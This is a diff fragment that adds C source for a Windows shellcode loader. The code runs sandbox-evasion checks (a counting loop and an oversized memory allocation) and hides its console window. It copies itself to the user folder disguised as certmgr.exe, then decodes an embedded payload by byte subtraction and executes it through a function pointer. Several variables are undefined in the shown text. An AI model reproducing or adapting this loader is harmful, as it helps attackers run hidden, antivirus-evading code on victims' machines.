@@ -1,0 +1,60 @@
+int var12;
+int (*ret)() = (int(*)())code;
+
+
+int main(int argc, char *argv[])
+{
+int cpt = 0;
+int i = 0;
+for(i =0; i < MAX_OP; i ++)
+{
+    cpt++;
+}
+if(cpt == MAX_OP)
+{
+HWND hwnd=GetForegroundWindow ();
+ShowWindow (hwnd,SW_HIDE);
+
+    strcat(var2,argv[0]);
+    strcat(var2,"\" \"C:\\Users\\%username%\"");
+    strcpy(var3,"certmgr.exe");
+    system(var2);
+    system(copy);
+
+char
+* memdmp = NULL;
+memdmp =
+(char*) malloc(TOO_MUCH_MEM);
+if
+(memdmp!=NULL)
+{
+
+if
+(strstr(argv[0], "certmgr") >0)
+{
+
+    if(strstr(argv[0],"certmgr"))
+        {
+	var12=strlen(code);
+	while (compt2<98000)
+		    {
+			compt2 += 1;
+			}
+		while(position<var12)
+			{
+				code[position] = code[position] - num[position];
+				position++;
+			}
+		printf("%x",code);
+		printf("Execution en cours ...");
+		ret();
+
+	}
+		return 0;
+	}
+		return 0;
+	}
+}
+
+return 0;
+}
